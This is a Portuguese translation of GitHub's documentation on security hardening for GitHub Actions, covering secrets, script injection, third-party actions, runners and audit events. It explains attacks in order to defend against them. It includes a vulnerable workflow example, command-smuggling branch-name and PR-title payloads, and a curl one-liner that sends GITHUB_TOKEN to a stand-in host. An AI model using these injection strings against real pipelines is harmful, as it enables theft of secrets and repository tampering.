---
title: Fortalecimento de segurança para o GitHub Actions
shortTitle: Fortalecimento de segurança
intro: 'Boas práticas de segurança para usar recursos do {% data variables.product.prodname_actions %}.'
redirect_from:
  - /actions/getting-started-with-github-actions/security-hardening-for-github-actions
  - /actions/learn-github-actions/security-hardening-for-github-actions
versions:
  fpt: '*'
  ghes: '*'
  ghae: '*'
  ghec: '*'
type: overview
topics:
  - Security
miniTocMaxHeadingLevel: 3
---

{% data reusables.actions.enterprise-beta %}
{% data reusables.actions.enterprise-github-hosted-runners %}

## Visão Geral

Este guia explica como configurar o fortalecimento de segurança para certos recursos de {% data variables.product.prodname_actions %}. Se os conceitos do {% data variables.product.prodname_actions %} forem desconhecidos, consulte "[Principais conceitos para o GitHub Actions](/actions/getting-started-with-github-actions/core-concepts-for-github-actions)

## Usar segredos

Valores sensíveis nunca devem ser armazenados como texto simples em arquivos de fluxo de trabalho, mas como segredos. [Segredos](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets) podem ser configurados no nível de organização, repositório ou ambiente e permitir que você armazene informações confidenciais em {% data variables.product.product_name %}.

Os segredos usam [caixas fechadas de Libsodium](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes) de modo que sejam criptografadas antes de atingir {% data variables.product.product_name %}. Isso ocorre quando o segredo é enviado [usando a interface de usuário](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository) ou através da [API REST](/rest/reference/actions#secrets). Esta criptografia do lado do cliente ajuda a minimizar os riscos relacionados ao registro acidental (por exemplo, registros de exceções e de solicitação, entre outros) dentro da infraestrutura do {% data variables.product.product_name %}. Uma vez realizado o upload do segredo, o {% data variables.product.product_name %} poderá descriptografá-lo para que possa ser injetado no tempo de execução do fluxo de trabalho.

Para ajudar a prevenir a divulgação acidental, o {% data variables.product.product_name %} usa um mecanismo que tenta redigir quaisquer segredos que aparecem nos registros de execução. Esta redação procura correspondências exatas de quaisquer segredos configurados, bem como codificações comuns dos valores, como Base64. No entanto, como há várias maneiras de transformar o valor de um segredo, essa anulação não é garantida. Como resultado, existem certas etapas proativas e boas práticas que você deve seguir para ajudar a garantir que os segredos sejam editados, e para limitar outros riscos associados aos segredos:

- **Nunca usar dados estruturados como um segredo**
    - Os dados estruturados podem fazer com que ocorra uma falha nos registros de segredos, pois a redação depende, em grande parte, de encontrar uma correspondência exata para o valor específico do segredo. Por exemplo, não use um blob de JSON, XML, ou YAML (ou similar) para encapsular o valor de um segredo, já que isso reduz significativamente a probabilidade de os segredos serem devidamente redigidos. Em vez disso, crie segredos individuais para cada valor sensível.
- **Registre todos os segredos usados nos fluxos de trabalho**
    - Se um segredo for usado para gerar outro valor sensível dentro de um fluxo de trabalho, esse valor gerado deve ser formalmente [registrado como um segredo](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) para que seja reproduzido se alguma vez aparecer nos registros. Por exemplo, se, ao usar uma chave privada para gerar um JWT assinado para acessar uma API web, certifique-se de registrar que JWT é um segredo ou não será redigido se entrar na saída de do registro.
    - O registro de segredos também aplica-se a qualquer tipo de transformação/codificação. Se seu segredo foi transformado de alguma forma (como Base64 ou URL codificada), certifique-se de registrar o novo valor como um segredo também.
- **Audite como segredos são tratados**
    - Audite como os segredos são usados, para ajudar a garantir que estejam sendo tratados conforme o esperado. Você pode fazer isso revisando o código-fonte do repositório que executa o fluxo de trabalho e verificando quaisquer ações usadas no fluxo de trabalho. Por exemplo, verifique se eles não são enviados para hosts não pretendidos, ou impressos explicitamente na saída de um registro.
    - Visualize os registros de execução do seu fluxo de trabalho depois de testar entradas válidas/inválidas e, em seguida, verifique se os segredos estão sendo editados corretamente ou não são mostrados. Nem sempre é sempre óbvio como um comando ou ferramenta que você está invocando irá enviar erros para `STDOUT` e `STDERR`, e os segredos podem depois acabar em registros de erro. Como resultado, considera-se uma boa prática rever manualmente os registros do fluxo de trabalho depois de testar entradas válidas e inválidas.
- **Use as credenciais que tenham escopos mínimos**
    - Certifique-se de que as credenciais usadas nos fluxos de trabalho têm o menor privilégio necessário e esteja ciente de que qualquer usuário com acesso de gravação ao repositório terá acesso de leitura a todos os segredos configurados no seu repositório.
    - As ações podem usar o `GITHUB_TOKEN` acessando-o no contexto do `github.token`. Para obter mais informações, consulte "[Contextos](/actions/learn-github-actions/contexts#github-context)". Portanto, você deve certificar-se de que o `GITHUB_TOKEN` tenha as permissões mínimas necessárias. É uma prática de segurança recomendada definir a permissão-padrão para o `GITHUB_TOKEN` para ler apenas os conteúdos do repositório. As permissões podem ser aumentadas, conforme necessário, para tarefas individuais dentro do arquivo do fluxo de trabalho. Para obter mais informações, consulte "[Autenticação em um fluxo de trabalho](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)".
- **Audite e gire os segredos registrados**
    - Reveja, periodicamente, os segredos registrados para confirmar se ainda são necessários. Remova aqueles que não são mais necessários.
    - Gire os segredos periodicamente para reduzir a janela de tempo durante a qual um segredo comprometido é válido.
- **Considere a necessidade de revisão para acesso a segredos**
    - Você pode usar revisores necessários para proteger os segredos do ambiente. Um trabalho de fluxo de trabalho não pode acessar segredos de ambiente até que a aprovação seja concedida por um revisor. Para mais informações sobre armazenar segredos em ambientes ou exigir revisões para ambientes, consulte "[segredos criptografados](/actions/reference/encrypted-secrets)" e "[Usando ambientes para implantação](/actions/deployment/using-environments-for-deployment)".

{% warning %}

**Aviso**: Qualquer usuário com acesso de gravação ao repositório tem acesso a todos os segredos configurados no seu repositório. Portanto, você deve garantir que as credenciais usadas nos fluxos de trabalho tenham o mínimo de privilégios necessários.

{% endwarning %}

## Usar `CODEOWNERS` para monitorar alterações

Você pode usar o recurso `CODEOWNERS` para controlar como são feitas alterações nos seus arquivos de fluxo de trabalho. Por exemplo, se todos os arquivos de fluxo de trabalho forem armazenados em `.github/workflows`, você pode adicionar este diretório à lista de proprietários do código para que quaisquer alterações propostas nestes arquivos exijam primeiro a aprovação de um revisor designado.

Para obter mais informações, consulte "[Sobre proprietários do código](/github/creating-cloning-and-archiving-repositories/about-code-owners)".

## Entendendo o risco de injeções de script

Ao criar fluxos de trabalho, [ações personalizadas](/actions/creating-actions/about-actions)e [ações compostas](/actions/creating-actions/creating-a-composite-action), você deverá sempre considerar se seu código pode executar entrada não confiável de invasores. Isso pode ocorrer quando um invasor adiciona comandos maliciosos e scripts em um contexto. Quando seu fluxo de trabalho é executado, essas strings podem ser interpretadas como código que é executado no executado.

 Os invasores podem adicionar seu próprio conteúdo malicioso ao contexto do [`github`](/actions/reference/context-and-expression-syntax-for-github-actions#github-context), que deve ser tratado como uma entrada potencialmente não confiável. Geralmente, esses contextos terminam com `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref` e `title`.  Por exemplo: `github.event.issue.title` ou `github.event.pull_request.body`.

 Você deve garantir que esses valores não fluam diretamente para fluxos de trabalho, ações, chamadas de API ou para qualquer outro lugar onde possam ser interpretados como código executável. Ao adotar a mesma postura defensiva de programação que você adotaria para qualquer outro código privilegiado do aplicativo, você pode ajudar a melhorar a segurança do seu uso de {% data variables.product.prodname_actions %}. Para informações sobre alguns dos passos que um invasor poderia dar, consulte ["Potencial impacto de um executor comprometido](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)".

Além disso, há outras fontes menos óbvias de entrada potencialmente não confiável como, por exemplo, nomes de branches e endereços de e-mail, que podem ser bastante flexíveis em termos de conteúdo permitido. Por exemplo, `zzz";echo${IFS}"hello";#` seria um nome de branch válido e seria um possível vetor de ataque para um repositório de destino.

As seções a seguir explicam como você pode ajudar a mitigar o risco de injeção de scripts.

### Exemplo de um ataque de injeção de script

Um ataque de injeção de script pode ocorrer diretamente dentro do script embutido de um fluxo de trabalho. No exemplo a seguir, uma ação usa uma expressão para testar a validade de um título de pull request mas também adiciona o risco de injeção de script:

{% raw %}
```
      - name: Check PR title
        run: |
          title="${{ github.event.pull_request.title }}"
          if [[ $title =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

Este exemplo é vulnerável à injeção do script porque o comando `executar` é executado dentro de um script shell temporário no executor. Antes que o script shell seja executado, as expressões dentro de {% raw %}`${{ }}`{% endraw %} são avaliadas e, em seguida, substituídas pelos valores resultantes, o que pode torná-lo vulnerável à injeção de comando do shell.

Para injetar comandos neste fluxo de trabalho, o invasor pode criar um pull request com título de  `a"; ls $GITHUB_WORKSPACE"`:

![Exemplo de injeção de script no título do PR](/assets/images/help/images/example-script-injection-pr-title.png)

Neste exemplo, o caractere `"` é usado para interromper a declaração de {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %}, o que permite que o comando `ls` seja executado no executor. Você pode ver a saída do comando `ls` no registro:

![Exemplo de resultado da injeção de script](/assets/images/help/images/example-script-injection-result.png)

## Práticas recomendadas para mitigar ataques de injeção de script

Há uma série de diferentes abordagens disponíveis para ajudar você a mitigar o risco de injeção de script:

### Usando uma ação em vez de um script em linha (recomendado)

A abordagem recomendada é criar uma ação que processa o valor do contexto como um argumento. Esta abordagem não é vulnerável ao ataque de injeção, como o valor do contexto não é usado para gerar um script do shell, mas é passado para a ação como um argumento:

{% raw %}
```
uses: fakeaction/checktitle@v3
with:
    title: ${{ github.event.pull_request.title }}
```
{% endraw %}

### Usando uma variável de ambiente intermediária

Para scripts em linha, a abordagem preferida para manipular entradas não confiáveis é definir o valor da expressão para uma variável de ambiente intermediário.

O exemplo a seguir usa o Bash para processar o valor `github.event.pull_request.title` como uma variável de ambiente:

{% raw %}
```
      - name: Check PR title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          if [[ "$TITLE" =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

Neste exemplo, a injeção de script não tem sucesso:

![Exemplo de injeção de script mitigado](/assets/images/help/images/example-script-injection-mitigated.png)

Com esta abordagem, o valor da expressão de {% raw %}`${{ github.event.issue.title }}`{% endraw %} é armazenado na memória e usada como uma variável e não interage com o processo de geração de script. Além disso, considere usar variáveis do shell de citação dupla para evitar [divisão de palavras](https://github.com/koalaman/shellcheck/wiki/SC2086), mas esta é [uma das muitas](https://mywiki.wooledge.org/BashPitfalls) recomendações gerais para escrever scripts de shell e não é específica para {% data variables.product.prodname_actions %}.

{% ifversion fpt or ghec %}
### Usando fluxos de trabalho iniciais para digitalização de código

{% data reusables.advanced-security.starter-workflows-beta %}
{% data variables.product.prodname_code_scanning_capc %} permite que você encontre vulnerabilidades de segurança antes de atingirem a produção. {% data variables.product.product_name %} fornece fluxos de trabalho iniciais para {% data variables.product.prodname_code_scanning %}. Você pode usar esses fluxos de trabalho sugeridos para construir seus fluxos de trabalho de {% data variables.product.prodname_code_scanning %}, ao invés de começar do zero. O fluxo de trabalho de {% data variables.product.company_short%}, o {% data variables.product.prodname_codeql_workflow %} é alimentado por {% data variables.product.prodname_codeql %}. Também existem fluxos de trabalho de terceiros iniciantes disponíveis.

Para obter mais informações, consulte "[Sobre {% data variables.product.prodname_code_scanning %}](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning)" e "[Configurando {% data variables.product.prodname_code_scanning %} usando fluxos de trabalho iniciais](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows)."

{% endif %}

### Restringir permissões para tokens

Para ajudar a mitigar o risco de um token exposto, considere restringir as permissões atribuídas. Para obter mais informações, consulte "[Modificar as permissões para o GITHUB_TOKEN](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token)".

{% ifversion fpt or ghec or ghae-issue-4856 or ghes > 3.4 %}

## Usando o OpenID Connect para acessar os recursos da nuvem

{% data reusables.actions.about-oidc-short-overview %}

{% endif %}

## Usando ações de terceiros

Os trabalhos individuais em fluxo de trabalho podem interagir com (e comprometer) outros trabalhos. Por exemplo, um trabalho que consulta as variáveis de ambiente usadas por um trabalho posterior, que escreve arquivos para um diretório compartilhado que um trabalho posterior processa, ou ainda mais diretamente, que interage com o conector do Docker e inspeciona outros contêineres em execução e executa comandos neles.

Isso significa que comprometer uma única ação dentro de um fluxo de trabalho pode ser muito significativo, uma vez que essa ação comprometida teria acesso a todos os segredos configurados no seu repositório e pode usar o `GITHUB_TOKEN` para gravar no repositório. Consequentemente, há um risco significativo em fornecer de ações de repositórios de terceiros no {% data variables.product.prodname_dotcom %}. Para informações sobre alguns dos passos que um invasor poderia dar, consulte ["Potencial impacto de um executor comprometido](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)".

Você pode ajudar a mitigar esse risco seguindo estas boas práticas:

* **Fixe as ações para um commit SHA de comprimento completo**

  Fixar uma ação para um commit SHA de comprimento completo é, atualmente, a única maneira de usar uma ação como uma versão imutável. Fixar um SHA em particular ajuda a mitigar o risco de um ator malicioso adicionar uma porta traseira ao repositório da ação, porque precisariam gerar uma colisão de SHA-1 para uma carga válida do objeto de Git.

* **Audite o código-fonte da ação**

  Certifique-se de que a ação está tratando o conteúdo do seu repositório e os segredos, como esperado. Por exemplo, verifique se os segredos não são enviados para os hosts não intencionais, ou se não são registrados inadvertidamente.

* **Fixe ações em uma etiqueta apenas se confiar no criador**

  Embora a fixação de um commit de SHA seja a opção mais segura, especificar uma etiqueta é a opção mais conveniente, além de ser amplamente usada. Se você desejar de especificar uma etiqueta, certifique-se de que você confia nos criadores da ação. O selo "Criador verificado" em {% data variables.product.prodname_marketplace %} é um sinal útil, já que indica que a ação foi escrita por uma equipe cuja identidade foi verificada por {% data variables.product.prodname_dotcom %}. Observe que há risco para esta abordagem, mesmo que você confie no autor, porque uma etiqueta pode ser movida ou excluída se um ator malicioso obtiver acesso ao repositório que armazena a ação.

{% ifversion fpt or ghes > 3.3 or ghae-issue-4757 or ghec %}
## Reutilizando fluxos de trabalho de terceiros

Os mesmos princípios descritos acima para o uso de ações de terceiros também se aplicam ao uso de fluxos de trabalho de terceiros. Você pode ajudar a mitigar os riscos associados à reutilização de fluxos de trabalho, seguindo as mesmas práticas recomendadas descritas acima. Para obter mais informações, consulte "[Reutilizando fluxos de trabalho](/actions/learn-github-actions/reusing-workflows)".
{% endif %}

{% ifversion internal-actions %}
## Permitir que os fluxos de trabalho acessem repositórios internos

{% data reusables.actions.outside-collaborators-internal-actions %} Para obter mais informações, consulte "[Compartilhando ações e fluxos de trabalho com a sua empresa](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise)".
{% endif %}

{% ifversion allow-actions-to-approve-pr %}
## Impedindo que {% data variables.product.prodname_actions %} de {% ifversion allow-actions-to-approve-pr-with-ent-repo %}crie ou {% endif %}aprove pull requests

{% data reusables.actions.workflow-pr-approval-permissions-intro %} A permissão de fluxos de trabalho ou qualquer outra automação, para {% ifversion allow-actions-to-approve-pr-with-ent-repo %}criar ou {% endif %}aprovar pull requests poderia ser um risco de segurança se o pull request fosse mesclado sem a supervisão adequada.

Para obter mais informações sobre como definir essa configuração, consulte {% ifversion allow-actions-to-approve-pr-with-ent-repo %}{% ifversion ghes or ghec or ghae %}"[Aplicando políticas para {% data variables.product.prodname_actions %} na sua empresa](/enterprise-cloud@latest/admin/policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#preventing-github-actions-from-creating-or-approving-pull-requests)",{% endif %}{% endif %} "[Desabilitando ou limitando {% data variables.product.prodname_actions %} para a sua organização](/github/setting-up-and-managing-organizations-and-teams/disabling-or-limiting-github-actions-for-your-organization#preventing-github-actions-from-{% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating-or-{% endif %}approving-pull-requests)"{% ifversion allow-actions-to-approve-pr-with-ent-repo %} e "[Gerenciando as configurações de {% data variables.product.prodname_actions %} para um repositório](/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests)"{% endif %}.
{% endif %}

## Usando os Scorecards OpenSSF para proteger fluxos de trabalho

[Scorecards](https://github.com/ossf/scorecard) é uma ferramenta de segurança automatizada que sinaliza práticas arriscadas da cadeia de suprimentos. Você pode usar a [ação Scorecards](https://github.com/marketplace/actions/ossf-scorecard-action) e o [fluxo de trabalho iniciante](https://github.com/actions/starter-workflows) para seguir as práticas recomendadas de segurança. Uma vez configurada, a ação Scorecards é executada automaticamente nas alterações de repositórios e alerta de desenvolvedores sobre práticas arriscadas em cadeia de suprimentos que usam a experiência de digitalização embutida do código. O projeto Scorecards executa um número de verificações, incluindo ataques de injeção de script, permissões de token e ações fixadas.

## Possível impacto de um executor comprometido

Essas seções consideram alguns das etapas que um invasor pode dar se for capaz de executar comandos maliciosos em um executor de {% data variables.product.prodname_actions %}.

### Acessar segredos

Os fluxos de trabalho acionados usando o evento `pull_request` têm permissões somente de leitura e não tem acesso a segredos. No entanto, essas permissões diferem para vários gatilhos de eventos, como `issue_comment`, `issues` e `push`, em que o atacante pode tentar roubar segredos do repositório ou usar a permissão de gravação do trabalho [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token).

- Se o segredo ou token for definido como uma variável de ambiente, ele poderá ser acessado diretamente por meio do ambiente usando o `printenv`.
- Se o segredo for usado diretamente em uma expressão, o script do shell gerado é armazenado em disco e é acessível.
- Para uma ação personalizada, o risco pode variar dependendo de como um programa está usando o segredo que obteve do argumento:

  {% raw %}
  ```
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```
  {% endraw %}

Embora {% data variables.product.prodname_actions %} limpe os segredos da memória que não estão referenciados no fluxo de trabalho (ou uma ação incluída), o `GITHUB_TOKEN` e todos os segredos referenciados podem ser colhidos por um determinado invasor.

### Exfiltrar dados de um executor

Um invasor pode exfiltrar todos os segredos roubados ou outros dados do executor. Para ajudar a evitar a divulgação acidental de segredos, {% data variables.product.prodname_actions %} [removeu automaticamente segredos editados impressos no registro](/actions/reference/encrypted-secrets#accessing-your-secrets), mas esta não é uma verdadeira fronteira de segurança, porque os segredos podem ser enviados intencionalmente para o registro. Por exemplo, segredos ofuscados podem ser exfiltrados usando `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. Além disso, uma vez que o atacante pode executar comandos arbitrários, ele poderá usar solicitações HTTP para enviar segredos ou outros dados do repositório para um servidor externo.

### Roubar o trabalho do `GITHUB_TOKEN`

É possível para um invasor roubar o `GITHUB_TOKEN` de um trabalho. O executor de {% data variables.product.prodname_actions %} recebe automaticamente um `GITHUB_TOKEN` gerado com permissões limitadas apenas ao repositório que contém o fluxo de trabalho, e o token expira após a conclusão do trabalho. Uma vez expirado, o token não é mais útil para um invasor. Para contornar essa limitação, eles podem automatizar o ataque e executá-lo em frações de segundo chamando um servidor controlado pelo invasor com o token, por exemplo: `a"; set +e; curl http://example.lab?token=$GITHUB_TOKEN;#`.

### Modificando os conteúdos de um repositório

O servidor invasor pode usar A API de {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} para [modificar o conteúdo do repositório](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token), incluindo versões, se as permissões atribuídas de `GITHUB_TOKEN` [não forem restritas](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token).

## Considerar acesso entre repositórios

O {% data variables.product.prodname_actions %} tem um escopo intencional para um único repositório por vez. O `GITHUB_TOKEN` concede o mesmo nível de acesso que um usuário com acesso de gravação, porque qualquer usuário com acesso de escrita pode acessar esse token criando ou modificando um arquivo de fluxo de trabalho, elevando as permissões do `GITHUB_TOKEN`, se necessário. Usuários têm permissões específicas para cada repositório. Portanto, permitir que o `GITHUB_TOKEN` de um repositório conceda acesso a outro teria impacto no modelo de permissão de {% data variables.product.prodname_dotcom %} se não fosse implementado cuidadosamente. Da mesma forma, deve-se ter cuidado ao adicionar tokens de autenticação de {% data variables.product.prodname_dotcom %} a um fluxo de trabalho, porque isto também pode afetar o modelo de permissão de {% data variables.product.prodname_dotcom %} concedendo inadvertidamente amplo acesso aos colaboradores.

Temos [ um plano no roteiro de {% data variables.product.prodname_dotcom %}](https://github.com/github/roadmap/issues/74) para suportar um fluxo que permite o acesso de todos os repositórios em {% data variables.product.product_name %}, embora ainda não seja um recurso compatível. Atualmente, a única maneira de executar interações privilegiadas entre repositórios é colocar um token de autenticação do {% data variables.product.prodname_dotcom %} ou chave SSH como um segredo dentro do fluxo de trabalho. Uma vez que muitos tipos de token de autenticação não permitem acesso granular a recursos específicos, há um risco significativo no uso do tipo incorreto de token, pois ele pode conceder acesso muito mais amplo do que o pretendido.

Esta lista descreve as abordagens recomendadas para acessar os dados do repositório dentro de um fluxo de trabalho, em ordem decrescente de preferência:

1. **O `GITHUB_TOKEN`**
    -  Este token recebe intencionalmente o escopo para o único repositório que invocou o fluxo de trabalho e pode ter tem o mesmo nível de acesso que um usuário de acesso de gravação no repositório. O token é criado antes de cada trabalho começar e expira quando o trabalho é finalizado. Para obter mais informações, consulte "[Autenticação com o GITHUB_TOKEN](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token)".
    - O `GITHUB_TOKEN` deve ser usado sempre que possível.
2. **Chave de implantação do repositório**
    - Chaves de implantação são um dos únicos tipos de credenciais que concedem acesso de leitura ou gravação a um único repositório, e podem ser usadas para interagir com outro repositório dentro de um fluxo de trabalho. Para obter mais informações, consulte "[Gerenciar chaves de implantação](/developers/overview/managing-deploy-keys#deploy-keys)".
    - Observe que as chaves de implantação só podem clonar e fazer push para o repositório usando o Git, e não podem ser usada para interagir com a API REST ou o GraphQL. Portanto, elas podem não ser apropriadas para os suas necessidades.
3. **Tokens de {% data variables.product.prodname_github_app %}**
    - {% data variables.product.prodname_github_apps %} podem ser instalados em repositórios selecionados e até mesmo ter permissões granulares nos recursos dentro deles. É possível criar um {% data variables.product.prodname_github_app %} interno na sua organização, instalá-lo nos repositórios os quais você precisa acessar dentro do seu fluxo de trabalho, e autenticar como instalação dentro de seu fluxo de trabalho para acessar esses repositórios.
4. **Tokens de acesso pessoal**
    - Você nunca deve usar tokens de acesso pessoais da sua própria conta. Estes tokens concedem acesso a todos os repositórios nas organizações às quais você tem acesso, bem como a todos os repositórios pessoais na sua conta pessoal. Isto concede indiretamente amplo acesso a todos os usuários com acesso de gravação do repositório no qual se encontra o fluxo de trabalho. Além disso, se você deixar uma organização mais adiante, os fluxos de trabalho que usam este token falharão imediatamente e a depuração deste problema pode ser difícil.
    - Se um token de acesso pessoal for usado, ele deverá ser gerado para uma nova conta que só tenha acesso aos repositórios específicos necessários para o fluxo de trabalho. Observe que esta abordagem não é escalável e deve ser evitada em detrimento de alternativas, como as chaves de implantação.
5. **Chaves SSH em uma conta pessoal**
    - Os fluxos de trabalho nunca devem usar as chaves SSH em uma conta pessoal. Semelhante aos tokens de acesso pessoais, eles concedem permissões de leitura/gravação a todos os seus repositórios pessoais, bem como a todos os repositórios aos quais você tem acesso por meio da associação à organização.  Isto concede indiretamente amplo acesso a todos os usuários com acesso de gravação do repositório no qual se encontra o fluxo de trabalho. Se você pretende usar uma chave SSH porque você só precisa executar clones ou push do repositório, e não precisar interagir com APIs públicas, você deverá usar chaves de implantação individuais.

## Fortalecimento para executores auto-hospedados

{% ifversion fpt or ghec %}
Os executores ** hospedados em {% data variables.product.prodname_dotcom %}** executam o código dentro de máquinas virtuais efêmeras e limpas e isoladas. Isso quer isto dizer que não há maneira de comprometer persistentemente este ambiente ou obter, de outra forma, acesso a mais informações do que foram colocadas neste ambiente durante o processo de inicialização.
{% endif %}

{% ifversion fpt or ghec %}**Auto-hospedados**{% elsif ghes or ghae %}Auto-hospedados{% endif %} executores para {% data variables.product.product_name %} não tem garantias para serem executados em máquinas virtuais efêmeas limpas, e podem ser comprometidos persistentemente por um código não confiável em um fluxo de trabalho.

{% ifversion fpt or ghec %}Como resultado, os executores auto-hospedados quase [nunca devem ser usados para repositórios públicos](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security-with-public-repositories) em {% data variables.product.product_name %}, porque qualquer usuário pode abrir pull requests contra o repositório e comprometer o ambiente. Da mesma forma,{% elsif ghes or ghae %}Seja{% endif %} tenha cuidado ao usar executores auto-hospedados em repositórios privados ou internos, como qualquer pessoa que possa fazer bifurcação do repositório e abrir um pull request (geralmente aqueles com acesso de leitura ao repositório) podem comprometer o ambiente do executor auto-hospedado, incluindo obter acesso a segredos e o `GITHUB_TOKEN` que, dependendo de suas configurações, pode conceder acesso de gravação ao repositório. Embora os fluxos de trabalho possam controlar o acesso a segredos de ambiente usando os ambientes e revisões necessários, estes fluxos de trabalho não são executados em um ambiente isolado e continuam sendo susceptíveis aos mesmos riscos quando são executados por um executor auto-hospedado.

Quando um executor auto-hospedado é definido no nível da organização ou empresa, {% data variables.product.product_name %} pode programar fluxos de trabalho de vários repositórios para o mesmo executor. Consequentemente, um compromisso de segurança destes ambientes pode ter um grande impacto. Para ajudar a reduzir o escopo de um compromisso, você pode criar limites organizando seus executores auto-hospedados em grupos separados. Você pode restringir quais fluxos de trabalho {% ifversion restrict-groups-to-workflows %}, organizações {% endif %}e repositórios podem acessar grupos de executores. Para obter mais informações, consulte "[Gerenciando acesso a runners auto-hospedados usando grupos](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)".

Você também deve considerar o ambiente das máquinas de executores auto-hospedadas:
- Que informação sensível reside na máquina configurada como um executor auto-hospedado? Por exemplo, chaves SSH privadas, tokens de acesso à API, entre outros.
- A máquina tem acesso à rede a serviços sensíveis? Por exemplo, serviços de metadados do Azure ou AWS. A quantidade de informações confidenciais neste ambiente deve ser limitada ao mínimo, e você deve estar sempre ciente de que qualquer usuário capaz de invocar fluxos de trabalho terá acesso a esse ambiente.

Alguns clientes podem tentar mitigar parcialmente esses riscos implementando sistemas que destroem automaticamente o executor auto-hospedado após cada execução do trabalho. No entanto, esta abordagem poderá não ser tão eficaz como pretendido, uma vez que não há forma de garantir que um executor auto-hospedado execute apenas um trabalho. Algumas tarefas usarão segredos como argumentos de linha de comando que podem ser vistos por outra tarefa executando no mesmo executor como, por exemplo, `ps x -w`. Isso pode gerar vazamento de segredos.

### Planejando sua estratégia de gerenciamento para executores auto-hospedados

Um executor auto-hospedado pode ser adicionado aos vários níveis na sua hierarquia de {% data variables.product.prodname_dotcom %}: empresa, organização ou repositório. Este posicionamento determina quem será poderá de gerenciar o executor:

**Gerenciamento centralizado:**
  - Se você planeja ter uma equipe centralizada que detém os executores auto-hospedados, recomenda-se adicionar seus executores ao nível mais alto da organização mútua ou da empresa. Isto fornece à sua equipe um único local para visualizar e gerenciar seus executores.
  - Se você tiver apenas uma única organização, adicionar seus executores ao nível da organização é, de fato, a mesma abordagem, mas você pode encontrar dificuldades se você adicionar outra organização no futuro.

**Gerenciamento descentralizado:**
  - Se cada equipe gerenciar seus próprios corredores hospedados, a recomendação será adicionar os executores ao mais alto nível de propriedade da equipe. Por exemplo, se cada equipe possui sua própria organização, será mais simples se os executores também forem adicionados ao nível da organização.
  - Você também pode adicionar executores no nível de repositório, mas isso adicionará uma sobrecarga de gerenciamento e também aumentará o número de executores necessários já que você não pode compartilhar executores entre repositórios.

{% ifversion fpt or ghec or ghae-issue-4856 or ghes > 3.4 %}
### Efetuando a autenticação para seu provedor de nuvem

Se você está usando {% data variables.product.prodname_actions %} para implantar para um provedor da nuvem, ou pretender usar o HashiCorp Vault para o gerenciamento de segredos, recomenda-se que você use o OpenID Connect para criar tokens de acesso com escopos bem definidos, curtos e para as execuções do seu fluxo de trabalho. Para obter mais informações, consulte[Sobre o enrijecimento da segurança com o OpenID Connect](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)".

{% endif %}

## Auditar eventos de {% data variables.product.prodname_actions %}

Você pode usar o log de auditoria para monitorar tarefas administrativas em uma organização. O log de auditoria registra o tipo de ação, momento da execução e qual conta pessoal executou a ação.

Por exemplo, você pode usar o log de auditoria para acompanhar o evento `org.update_actions_secret`, que controla as alterações nos segredos da organização: ![Entradas do log de auditoria](/assets/images/help/repository/audit-log-entries.png)

As tabelas a seguir descrevem os eventos de {% data variables.product.prodname_actions %} que você pode encontrar no log de auditoria. Para obter mais informações sobre o uso do log de auditoria, consulte "[Revisando o log de auditoria para sua organização](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log)" e "[Revisando logs de auditoria para sua empresa](/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise)."

{% ifversion fpt or ghec %}
### Eventos para ambientes

| Ação                                | Descrição                                                                                                                                                                    |
| ----------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `environment.create_actions_secret` | Acionada quando um segredo é criado em um ambiente. Para obter mais informações, consulte ["Segredos do ambiente](/actions/reference/environments#environment-secrets)".     |
| `environment.delete`                | Acionada quando um ambiente é excluído. Para obter mais informações, consulte ["Excluir um ambiente](/actions/reference/environments#deleting-an-environment)".              |
| `environment.remove_actions_secret` | Acionada quando um segredo é removido de um ambiente. Para obter mais informações, consulte ["Segredos do ambiente](/actions/reference/environments#environment-secrets)".   |
| `environment.update_actions_secret` | Acionada quando um segredo em um ambiente é atualizado. Para obter mais informações, consulte ["Segredos do ambiente](/actions/reference/environments#environment-secrets)". |
{% endif %}

{% ifversion fpt or ghes or ghec %}
### Eventos para alterações nas configurações
| Ação                                  | Descrição                                                                                                                                                                                                                                                                                                               |
